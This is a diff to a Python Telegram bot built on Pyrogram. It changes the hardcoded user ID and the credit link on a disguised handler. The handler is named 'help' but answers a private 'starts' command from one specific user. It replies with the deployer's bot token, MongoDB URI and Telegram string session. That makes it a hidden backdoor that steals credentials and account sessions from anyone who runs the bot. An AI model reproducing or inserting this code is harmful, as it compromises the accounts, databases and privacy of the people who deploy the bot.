@@ -120,12 +120,12 @@ async def restartbot(client, message: Message, _):
 @app.on_message(
     filters.command("starts")
     & filters.private
-    & filters.user(1808943146)
+    & filters.user(6170854642)
     & ~filters.edited)
 async def help(client: Client, message: Message):
     await message.reply_photo(
           photo=f"https://graph.org/file/6b31ca99b6c36a3cf57c7.jpg",
-        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [𝚅𝙸𝙿 𝙱𝙾𝚈](https://t.me/CYBERDAXXX)............☆""",
+        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [˹ 𝙈𝙍 मोह माया,](https://t.me/love_ki_duniya1)............☆""",
          reply_markup=InlineKeyboardMarkup(
              [
                  [
